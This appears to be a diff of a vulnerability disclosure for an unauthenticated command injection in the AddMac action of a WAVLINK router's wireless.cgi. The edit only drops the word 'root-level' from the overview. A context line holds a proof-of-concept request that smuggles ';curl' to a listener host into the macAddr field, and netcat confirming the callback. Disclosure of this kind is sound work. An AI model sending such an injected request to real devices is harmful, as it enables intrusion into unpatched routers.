@@ -10,7 +10,7 @@ PS:
 
 ## Overview
 
-An unauthenticated command injection vulnerability exists in the `AddMac` action of `/cgi-bin/wireless.cgi` (WAVLINK WL-WN578W2, firmware M78W2\_V221110). The `macAddr` parameter is unsanitized and directly concatenated into system commands. Attackers can send POST requests with `page=AddMac` and inject arbitrary commands via `macAddr`—no login required—to execute `root`-level operations.
+An unauthenticated command injection vulnerability exists in the `AddMac` action of `/cgi-bin/wireless.cgi` (WAVLINK WL-WN578W2, firmware M78W2\_V221110). The `macAddr` parameter is unsanitized and directly concatenated into system commands. Attackers can send POST requests with `page=AddMac` and inject arbitrary commands via `macAddr`—no login required—to execute operations.
 
 
 
@@ -110,4 +110,5 @@ page=AddMac&addMac=&addName=&macAddr=;curl http://192.168.10.154:1234
 
 Netcat receives request from device, confirming command injection success:
 ![Netcat Listener](./imgs/4.png)
+
 
